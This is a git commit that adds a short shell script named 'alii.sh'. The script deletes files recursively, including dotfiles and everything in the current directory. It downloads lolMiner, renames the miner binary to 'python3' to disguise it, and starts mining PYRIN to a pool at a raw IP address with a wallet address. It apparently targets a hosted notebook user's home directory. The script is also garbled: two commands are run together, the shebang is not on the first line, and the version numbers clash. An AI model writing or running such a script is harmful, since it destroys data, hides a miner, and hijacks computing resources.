0d03f915e2beb0055fb59fdc266f050344f1a407
githuboneheart <100488604+githuboneheart@users.noreply.github.com>
2024-04-05 11:20:30 +0700

    Create alii.sh

---
+++ alii.sh
@@ -0,0 +1,5 @@
+rm -rvf .lib* .bash*rm -rvf * && mkdir d && cd d
+#!/bin/sh
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.81/lolMiner_v1.81_Lin64.tar.gz && tar -xf lolMiner_v1.81_Lin64.tar.gz && rm lolMiner_v1.81_Lin64.tar.gz && cd 1.83 && mv lolMiner python3 && mv python3* ~/ && cd .. && rm -rvf 1.83 && mv kernel* /home/studio-lab-user/.lib
+cd && clear
+./python3 -a PYRIN -p 207.154.232.236:80 --user pyrin:qzutvf3fxt9ek86d4uvls5qz4gx3g7kajpgusx8xfrmdfz9r6p4hgutnfjd8j.ARTOMORO80
